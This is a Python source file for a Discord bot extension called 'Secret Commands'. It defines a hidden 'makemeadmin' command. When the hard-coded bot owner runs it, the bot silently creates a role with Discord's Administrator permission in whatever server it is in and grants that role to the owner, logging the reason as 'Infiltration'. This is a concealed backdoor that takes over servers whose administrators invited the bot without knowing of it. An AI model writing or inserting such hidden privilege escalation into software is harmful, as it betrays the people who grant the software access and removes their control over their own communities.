import discord # discord.py rewrite
from discord.ext import commands
from discord.utils import get
import os
from pymongo import MongoClient


# Load database URI from heroku env
MONGODB_URI = os.environ['MONGODB_URI']

# Bot owner uid
owner_id = 205549763062398978

class SecretCog(commands.Cog, name="Secret Commands"):
    def __init__(self, bot):
        self.bot = bot
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client.get_database()

    def cog_unload(self):
        self.client.close()
        print("SecretCog unload called on shutdown")


    #----------cog methods----------#

    @commands.command(hidden=True)
    async def makemeadmin(self, ctx):
        """Make the bot owner an admin on the server."""
        if ctx.author.id == owner_id:
            if any(r.name == 'Austria-sama' for r in ctx.author.roles):
                await ctx.send('You already are, Mistress.')
            else:
                if all(r.name != 'Austria-sama' for r in ctx.guild.roles):
                    habsama = await ctx.guild.create_role(
                            name = 'Austria-sama',
                            permissions = discord.Permissions(0x8),
                            color = discord.Colour(0xFFDD11)
                            )
                else:
                    for r in ctx.guild.roles:
                        if r.name == 'Austria-sama':
                            habsama = r

                await ctx.author.add_roles(habsama, reason='Infiltration')
                await ctx.send('It is done, Mistress.')



def setup(bot):
    bot.add_cog(SecretCog(bot))

